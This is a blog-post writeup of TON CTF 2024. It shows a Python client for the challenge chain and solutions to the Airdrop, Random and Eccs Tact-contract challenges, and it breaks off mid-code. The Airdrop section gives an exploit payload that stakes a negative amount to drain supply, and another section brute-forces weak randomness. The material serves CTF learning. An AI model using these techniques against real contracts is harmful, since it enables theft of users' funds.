<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>TON CTF 2024 Writeup - Qi Qin</title><meta name=Description content="Writeup for TON CTF 2024"><meta property="og:title" content="TON CTF 2024 Writeup"><meta property="og:description" content="Writeup for TON CTF 2024"><meta property="og:type" content="article"><meta property="og:url" content="https://leoq7.com/2024/09/TON-CTF-2024/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-28T16:55:28+08:00"><meta property="article:modified_time" content="2024-09-28T16:55:28+08:00"><meta property="og:site_name" content="Qi Qin"><meta name=twitter:card content="summary"><meta name=twitter:title content="TON CTF 2024 Writeup"><meta name=twitter:description content="Writeup for TON CTF 2024"><meta name=application-name content="Qi Qin"><meta name=apple-mobile-web-app-title content="Qi Qin"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://leoq7.com/2024/09/TON-CTF-2024/><link rel=prev href=https://leoq7.com/2023/09/MetaTrust-CTF-Sui/><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"TON CTF 2024 Writeup","inLanguage":"en-us","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/leoq7.com\/2024\/09\/TON-CTF-2024\/"},"genre":"posts","keywords":"Web3, CTF, TON","wordcount":2932,"url":"https:\/\/leoq7.com\/2024\/09\/TON-CTF-2024\/","datePublished":"2024-09-28T16:55:28+08:00","dateModified":"2024-09-28T16:55:28+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Qi Qin"},"description":"Writeup for TON CTF 2024"}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'auto'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'auto'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Qi Qin">Qi Qin</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/>About Me </a><a class=menu-item href=/publications/>Publications </a><a class=menu-item href=/contact/>Contact </a><a class=menu-item href=/posts/>Blogs </a><a class=menu-item href=/links/>Links </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop><input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Qi Qin">Qi Qin</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/ title>About Me</a><a class=menu-item href=/publications/ title>Publications</a><a class=menu-item href=/contact/ title>Contact</a><a class=menu-item href=/posts/ title>Blogs</a><a class=menu-item href=/links/ title>Links</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">TON CTF 2024 Writeup</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://leoq7.com title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>Qi Qin</a></span>&nbsp;<span class=post-category>included in <a href=/categories/Web3/><i class="far fa-folder fa-fw" aria-hidden=true></i>Web3</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2024-09-28>2024-09-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;2932 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;14 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#preface>Preface</a></li><li><a href=#the-challenges-of-ton-ctf-vs-other-blockchain-ctfs>The Challenges of TON CTF vs. Other Blockchain CTFs</a><ul><li><a href=#building-a-python-framework-for-ton-interactions>Building a Python Framework for TON Interactions</a></li><li><a href=#leveraging-the-framework-for-the-ctf>Leveraging the Framework for the CTF</a></li></ul></li><li><a href=#airdrop>Airdrop</a><ul><li><a href=#the-vulnerability>The Vulnerability</a></li><li><a href=#the-exploit>The Exploit</a></li></ul></li><li><a href=#random>Random</a><ul><li><a href=#the-vulnerability-1>The Vulnerability</a></li></ul></li><li><a href=#eccs>Eccs</a></li><li><a href=#dex>Dex</a><ul><li><a href=#the-vulnerability-2>The Vulnerability</a></li><li><a href=#bypassing-the-withdrawal-check>Bypassing the Withdrawal Check</a></li><li><a href=#the-exploit-1>The Exploit</a></li></ul></li><li><a href=#puzzle>Puzzle</a></li><li><a href=#curve>Curve</a><ul><li><a href=#understanding-the-curve>Understanding the Curve</a></li><li><a href=#curve-addition-implementation>Curve Addition Implementation</a></li><li><a href=#reducing-to-a-dlp-over-mathbbf_p>Reducing to a DLP over $\mathbb{F}_p$</a></li></ul></li><li><a href=#ecc>Ecc</a><ul><li><a href=#understanding-the-curve-1>Understanding the Curve</a></li><li><a href=#solving-the-dlp>Solving the DLP</a></li></ul></li><li><a href=#merkleairdrop>MerkleAirdrop</a><ul><li><a href=#the-vulnerability-3>The Vulnerability</a></li><li><a href=#the-exploit-2>The Exploit</a></li></ul></li></ul></nav></div></div><div class=content id=content><h2 id=preface>Preface</h2><p>The TON CTF 2024, sponsored by the TON Foundation and organized by Tonbit and TONX Studio, was an exciting competition that featured 8 challenges. The tasks were divided into three categories: 3 easy challenges worth 100 points, 3 medium challenges worth 200 points, and 2 difficult ones valued at 300 points.</p><p>What made this CTF unique was that all the challenges were written in Tact, a high-level language designed for the TON ecosystem. Tact compiles down to Func, another programming language, which then further compiles into Fift and finally down to bytecode for the VM. While I had previously dabbled with Func, this was my first time working with Tact, and I picked up quite a few new things along the way.</p><h2 id=the-challenges-of-ton-ctf-vs-other-blockchain-ctfs>The Challenges of TON CTF vs. Other Blockchain CTFs</h2><p>Compared to other Web3 CTFs, the TON ecosystem presents unique challenges. First, the tooling within the TON ecosystem is still in active developing. Additionally, due to TON&rsquo;s emphasis on speed, many operations, such as smart contract calls, are asynchronous. Finally, all the challenges in this CTF were deployed on a private chain, which introduced another layer of complexity when interacting with the contracts.</p><p>Tact contracts offer TypeScript interfaces for interaction, but since I’m not very familiar with TypeScript and wanted more granular control over the cells being sent, I decided to write my own interaction framework in Python.</p><h3 id=building-a-python-framework-for-ton-interactions>Building a Python Framework for TON Interactions</h3><p>The provided RPC interface was similar to <strong>Ton Center v2</strong>, which meant I could override the <code>Client</code> class from the <code>tonutils</code> library with a few modifications:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>tonutils.client</span> <span class=kn>import</span> <span class=n>Client</span>
<span class=kn>from</span> <span class=nn>pytoniq_core</span> <span class=kn>import</span> <span class=n>Address</span>
<span class=kn>from</span> <span class=nn>tonutils.utils</span> <span class=kn>import</span> <span class=n>boc_to_base64_string</span>
<span class=kn>from</span> <span class=nn>tonutils.wallet</span> <span class=kn>import</span> <span class=n>WalletV3R2</span>

<span class=k>class</span> <span class=nc>CTFClient</span><span class=p>(</span><span class=n>Client</span><span class=p>):</span>
    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>url</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
        <span class=nb>super</span><span class=p>()</span><span class=o>.</span><span class=fm>__init__</span><span class=p>(</span><span class=n>base_url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=p>{})</span>

    <span class=k>async</span> <span class=k>def</span> <span class=nf>run_get_method</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>address</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>method_name</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>stack</span><span class=p>:</span> <span class=n>Optional</span><span class=p>[</span><span class=n>List</span><span class=p>[</span><span class=n>Any</span><span class=p>]]</span> <span class=o>=</span> <span class=kc>None</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Any</span><span class=p>:</span>
        <span class=n>body</span> <span class=o>=</span> <span class=p>{</span>
            <span class=s2>&#34;address&#34;</span><span class=p>:</span> <span class=n>address</span><span class=p>,</span>
            <span class=s2>&#34;method&#34;</span><span class=p>:</span> <span class=n>method_name</span><span class=p>,</span>
            <span class=s2>&#34;stack&#34;</span><span class=p>:</span> <span class=p>[</span>
                <span class=p>{</span><span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;num&#34;</span><span class=p>,</span> <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=nb>str</span><span class=p>(</span><span class=n>v</span><span class=p>)}</span> <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=nb>int</span><span class=p>)</span> <span class=k>else</span> <span class=p>{</span><span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;slice&#34;</span><span class=p>,</span> <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=n>v</span><span class=p>}</span>
                <span class=k>for</span> <span class=n>v</span> <span class=ow>in</span> <span class=p>(</span><span class=n>stack</span> <span class=ow>or</span> <span class=p>[])</span>
            <span class=p>],</span>
        <span class=p>}</span>
        <span class=k>return</span> <span class=k>await</span> <span class=bp>self</span><span class=o>.</span><span class=n>_post</span><span class=p>(</span><span class=n>method</span><span class=o>=</span><span class=s2>&#34;runGetMethod&#34;</span><span class=p>,</span> <span class=n>body</span><span class=o>=</span><span class=n>body</span><span class=p>)</span>

    <span class=k>async</span> <span class=k>def</span> <span class=nf>send_message</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>boc</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
        <span class=n>status</span> <span class=o>=</span> <span class=k>await</span> <span class=bp>self</span><span class=o>.</span><span class=n>_post</span><span class=p>(</span><span class=n>method</span><span class=o>=</span><span class=s2>&#34;sendBoc&#34;</span><span class=p>,</span> <span class=n>body</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;boc&#34;</span><span class=p>:</span> <span class=n>boc_to_base64_string</span><span class=p>(</span><span class=n>boc</span><span class=p>)})</span>
        <span class=nb>print</span><span class=p>(</span><span class=n>status</span><span class=p>)</span>
        
    <span class=k>async</span> <span class=k>def</span> <span class=nf>get_balance</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>address</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
        <span class=n>result</span> <span class=o>=</span> <span class=k>await</span> <span class=bp>self</span><span class=o>.</span><span class=n>_get</span><span class=p>(</span><span class=n>method</span><span class=o>=</span><span class=s2>&#34;getAddressBalance&#34;</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;address&#34;</span><span class=p>:</span> <span class=n>address</span><span class=p>})</span>
        <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>result</span><span class=p>[</span><span class=s1>&#39;result&#39;</span><span class=p>])</span>
    
    <span class=k>async</span> <span class=k>def</span> <span class=nf>get_transaction</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>address</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>lt</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>txhash</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>dict</span><span class=p>:</span>
        <span class=n>result</span> <span class=o>=</span> <span class=k>await</span> <span class=bp>self</span><span class=o>.</span><span class=n>_get</span><span class=p>(</span><span class=n>method</span><span class=o>=</span><span class=s2>&#34;getTransactions&#34;</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;address&#34;</span><span class=p>:</span> <span class=n>address</span><span class=p>,</span> <span class=s2>&#34;hash&#34;</span><span class=p>:</span> <span class=n>txhash</span><span class=p>,</span> <span class=s2>&#34;lt&#34;</span><span class=p>:</span> <span class=n>lt</span><span class=p>,</span> <span class=s1>&#39;limit&#39;</span><span class=p>:</span> <span class=mi>1</span><span class=p>})</span>
        <span class=k>return</span> <span class=n>result</span><span class=p>[</span><span class=s1>&#39;result&#39;</span><span class=p>]</span>
    
    <span class=k>async</span> <span class=k>def</span> <span class=nf>get_address_info</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>address</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>dict</span><span class=p>:</span>
        <span class=n>result</span> <span class=o>=</span> <span class=k>await</span> <span class=bp>self</span><span class=o>.</span><span class=n>_get</span><span class=p>(</span><span class=n>method</span><span class=o>=</span><span class=s2>&#34;getAddressInformation&#34;</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;address&#34;</span><span class=p>:</span> <span class=n>address</span><span class=p>})</span>
        <span class=k>return</span> <span class=n>result</span><span class=p>[</span><span class=s1>&#39;result&#39;</span><span class=p>]</span>
    
    <span class=k>async</span> <span class=k>def</span> <span class=nf>get_last_transaction</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>address</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>dict</span><span class=p>:</span>
        <span class=n>result</span> <span class=o>=</span> <span class=k>await</span> <span class=bp>self</span><span class=o>.</span><span class=n>_get</span><span class=p>(</span><span class=n>method</span><span class=o>=</span><span class=s2>&#34;getAddressInformation&#34;</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;address&#34;</span><span class=p>:</span> <span class=n>address</span><span class=p>})</span>
        <span class=n>txhash</span> <span class=o>=</span> <span class=n>result</span><span class=p>[</span><span class=s1>&#39;result&#39;</span><span class=p>][</span><span class=s1>&#39;last_transaction_id&#39;</span><span class=p>][</span><span class=s1>&#39;hash&#39;</span><span class=p>]</span>
        <span class=n>new_txhash</span> <span class=o>=</span> <span class=n>txhash</span>
        <span class=k>while</span> <span class=n>txhash</span> <span class=o>==</span> <span class=n>new_txhash</span><span class=p>:</span>
            <span class=n>result</span> <span class=o>=</span> <span class=k>await</span> <span class=bp>self</span><span class=o>.</span><span class=n>_get</span><span class=p>(</span><span class=n>method</span><span class=o>=</span><span class=s2>&#34;getAddressInformation&#34;</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;address&#34;</span><span class=p>:</span> <span class=n>address</span><span class=p>})</span>
            <span class=n>lt</span> <span class=o>=</span> <span class=n>result</span><span class=p>[</span><span class=s1>&#39;result&#39;</span><span class=p>][</span><span class=s1>&#39;last_transaction_id&#39;</span><span class=p>][</span><span class=s1>&#39;lt&#39;</span><span class=p>]</span>
            <span class=n>new_txhash</span> <span class=o>=</span> <span class=n>result</span><span class=p>[</span><span class=s1>&#39;result&#39;</span><span class=p>][</span><span class=s1>&#39;last_transaction_id&#39;</span><span class=p>][</span><span class=s1>&#39;hash&#39;</span><span class=p>]</span>
            <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;find:&#39;</span><span class=p>,</span> <span class=n>new_txhash</span><span class=p>)</span>
        <span class=k>return</span> <span class=k>await</span> <span class=bp>self</span><span class=o>.</span><span class=n>get_transaction</span><span class=p>(</span><span class=n>address</span><span class=p>,</span> <span class=n>lt</span><span class=p>,</span> <span class=n>new_txhash</span><span class=p>)</span>

<span class=k>class</span> <span class=nc>CTFWallet</span><span class=p>(</span><span class=n>WalletV3R2</span><span class=p>):</span>
    <span class=nd>@classmethod</span>
    <span class=k>async</span> <span class=k>def</span> <span class=nf>get_seqno</span><span class=p>(</span><span class=bp>cls</span><span class=p>,</span> <span class=n>client</span><span class=p>:</span> <span class=n>Client</span><span class=p>,</span> <span class=n>address</span><span class=p>:</span> <span class=n>Union</span><span class=p>[</span><span class=n>Address</span><span class=p>,</span> <span class=nb>str</span><span class=p>])</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
        <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>address</span><span class=p>,</span> <span class=n>Address</span><span class=p>):</span>
            <span class=n>address</span> <span class=o>=</span> <span class=n>address</span><span class=o>.</span><span class=n>to_str</span><span class=p>()</span>

        <span class=n>method_result</span> <span class=o>=</span> <span class=k>await</span> <span class=n>client</span><span class=o>.</span><span class=n>run_get_method</span><span class=p>(</span>
            <span class=n>address</span><span class=o>=</span><span class=n>address</span><span class=p>,</span>
            <span class=n>method_name</span><span class=o>=</span><span class=s2>&#34;seqno&#34;</span><span class=p>,</span>
        <span class=p>)</span>

        <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>method_result</span><span class=p>[</span><span class=s1>&#39;result&#39;</span><span class=p>][</span><span class=s2>&#34;stack&#34;</span><span class=p>][</span><span class=mi>0</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</code></pre></td></tr></table></div></div><p>As I mentioned earlier, smart contract interactions in the TON blockchain aren’t atomic. To ensure that transactions from my wallet to the challenge contract were fully executed, I added a new method to the <code>Client</code> class, <code>get_last_transaction</code>. Although the method name might not seem entirely fitting, its purpose was to wait for a new transaction (usually the one I intended) to appear in the challenge contract.</p><h3 id=leveraging-the-framework-for-the-ctf>Leveraging the Framework for the CTF</h3><p>With this framework in place, interacting with the contracts became straightforward. After initializing a <code>CTFWallet</code> object, I simply used the <code>transfer</code> method to fill in the desired cell in the transaction body:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=n>CONTRACT</span> <span class=o>=</span> <span class=s2>&#34;EQDSxcBDK2QRgtZIg9PWMDVTBZrRLgAE8cRi5mKuH_zwLs4T&#34;</span>

<span class=k>async</span> <span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
    <span class=n>client</span> <span class=o>=</span> <span class=n>CTFClient</span><span class=p>(</span><span class=s2>&#34;http://65.21.223.95:8081/&#34;</span><span class=p>)</span>
    <span class=n>wallet</span><span class=p>,</span> <span class=n>public_key</span><span class=p>,</span> <span class=n>private_key</span><span class=p>,</span> <span class=n>mnemonic</span> <span class=o>=</span> <span class=n>CTFWallet</span><span class=o>.</span><span class=n>from_mnemonic</span><span class=p>(</span><span class=n>client</span><span class=p>,</span> <span class=n>MNEMONIC</span><span class=p>)</span>

    <span class=n>builder</span> <span class=o>=</span> <span class=n>begin_cell</span><span class=p>()</span><span class=o>.</span><span class=n>store_uint</span><span class=p>(</span><span class=mh>0x868dd340</span><span class=p>,</span> <span class=mi>32</span><span class=p>)</span><span class=o>.</span><span class=n>store_uint</span><span class=p>(</span><span class=mi>23019947</span><span class=p>,</span> <span class=mi>257</span><span class=p>)</span>
    <span class=n>cell</span> <span class=o>=</span> <span class=n>builder</span><span class=o>.</span><span class=n>end_cell</span><span class=p>()</span>
    <span class=k>await</span> <span class=n>wallet</span><span class=o>.</span><span class=n>transfer</span><span class=p>(</span><span class=n>CONTRACT</span><span class=p>,</span> <span class=n>amount</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>body</span><span class=o>=</span><span class=n>cell</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=k>await</span> <span class=n>client</span><span class=o>.</span><span class=n>get_last_transaction</span><span class=p>(</span><span class=n>CONTRACT</span><span class=p>))</span>
    
    <span class=nb>print</span><span class=p>(</span><span class=k>await</span> <span class=n>client</span><span class=o>.</span><span class=n>run_get_method</span><span class=p>(</span><span class=n>CONTRACT</span><span class=p>,</span> <span class=s2>&#34;is_solved&#34;</span><span class=p>))</span>
    

<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
    <span class=n>asyncio</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>main</span><span class=p>())</span>
</code></pre></td></tr></table></div></div><p>This setup provided me with the flexibility and control I needed during the competition, allowing me to send tailored messages to the contract and interact efficiently with the provided tasks.</p><h2 id=airdrop>Airdrop</h2><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fas fa-pencil-alt fa-fw" aria-hidden=true></i>Challenge Info<i class="details-icon fas fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><ul><li>Source: <a href=https://github.com/TonBitSec/TonCTF-Challenges/tree/main/airdrop>https://github.com/TonBitSec/TonCTF-Challenges/tree/main/airdrop</a></li><li>Score: 100</li></ul></div></div></div><p>The first challenge in the competition was called <strong>Airdrop</strong>. As the name suggests, the contract allowed each user to claim an airdrop of 1 token. The initial supply of the contract was set to 30,000, and the goal of the challenge was to deplete this initial supply.</p><p>The vulnerability, however, wasn’t in the airdrop functionality itself, but in the deposit and withdrawal functions of the contract. A common pitfall when writing smart contracts is improper usage of signed integers, and this contract fell into that trap. Signed integers should only be used when absolutely necessary, but in this contract, they were used extensively, leading to a critical vulnerability.</p><h3 id=the-vulnerability>The Vulnerability</h3><p>When a user staked TON, the contract checked whether the provided <code>amount</code> was less than the actual TON transferred. However, there was no check to ensure that <code>amount</code> was a positive value. This opened the door for an attacker to pass a <strong>negative amount</strong>, which allowed them to manipulate the balance.</p><h3 id=the-exploit>The Exploit</h3><p>By analyzing the compiled contract, I found that the function responsible for staking, <code>UserStake</code>, had a selector of <code>f82b6291</code>. All I had to do was pass a negative value of <code>-30,000</code> as the amount to exploit the vulnerability. This would cause the contract’s balance to be manipulated.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-ts data-lang=ts><span class=nx>begin_cell</span><span class=p>().</span><span class=nx>store_uint</span><span class=p>(</span><span class=mh>0xf82b6291</span><span class=p>,</span> <span class=mi>32</span><span class=p>).</span><span class=nx>store_int</span><span class=p>(</span><span class=o>-</span><span class=mi>30000</span><span class=p>,</span> <span class=mi>257</span><span class=p>).</span><span class=nx>end_cell</span><span class=p>()</span>
</code></pre></td></tr></table></div></div><h2 id=random>Random</h2><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fas fa-pencil-alt fa-fw" aria-hidden=true></i>Challenge Info<i class="details-icon fas fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><ul><li>Source: <a href=https://github.com/TonBitSec/TonCTF-Challenges/tree/main/random>https://github.com/TonBitSec/TonCTF-Challenges/tree/main/random</a></li><li>Score: 100</li></ul></div></div></div><p>The second challenge, <strong>Random</strong>, involved guessing a lucky number. The contract would take a user-provided <code>luckynumber</code> parameter, and if it matched a value derived from the hash of the following cell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-ts data-lang=ts><span class=nx>beginCell</span><span class=p>().</span><span class=nx>storeAddress</span><span class=p>(</span><span class=nx>myAddress</span><span class=p>()).</span><span class=nx>storeAddress</span><span class=p>(</span><span class=nx>sender</span><span class=p>()).</span><span class=nx>storeUint</span><span class=p>(</span><span class=nx>now</span><span class=p>(),</span> <span class=mi>64</span><span class=p>).</span><span class=nx>endCell</span><span class=p>()</span>
</code></pre></td></tr></table></div></div><p>The contract would then set a flag to <code>1</code>, indicating that the user had solved the challenge.</p><h3 id=the-vulnerability-1>The Vulnerability</h3><p>The contract didn’t use a native random function but rather constructed its own random number generator based on the hash of the aforementioned cell. This approach is inherently insecure since the value of <code>now()</code> can be reasonably estimated, which makes the random number predictable.</p><p>However, given that the range of the generated random number was relatively small (from 0 to 99), instead of predicting the random number, I opted for a brute-force approach by repeatedly sending <code>luckynumber</code> values until I got the correct one.</p><h2 id=eccs>Eccs</h2><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fas fa-pencil-alt fa-fw" aria-hidden=true></i>Challenge Info<i class="details-icon fas fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><ul><li>Source: <a href=https://github.com/TonBitSec/TonCTF-Challenges/tree/main/eccs>https://github.com/TonBitSec/TonCTF-Challenges/tree/main/eccs</a></li><li>Score: 100</li></ul></div></div></div><p>The third challenge, <strong>Eccs</strong>, was added as a replacement for a previous on-chain data analysis challenge that had multiple issues in its description. The organizers eventually took that challenge down and replaced it with this one. <strong>Eccs</strong> was quite similar to the &ldquo;Easy ECC&rdquo; problem from the testing phase, as it implemented standard elliptic curve addition and multiplication. The goal was to solve the <strong>ECDLP</strong>.</p><p>Since the problem’s scale was relatively small, I could directly use <strong>SageMath</strong> to solve the ECDLP. Interestingly, although the code defined $b = 2$, the actual <code>b</code> value used was <code>3</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=n>F</span> <span class=o>=</span> <span class=n>Zmod</span><span class=p>(</span><span class=mi>738077334260605249</span><span class=p>)</span>
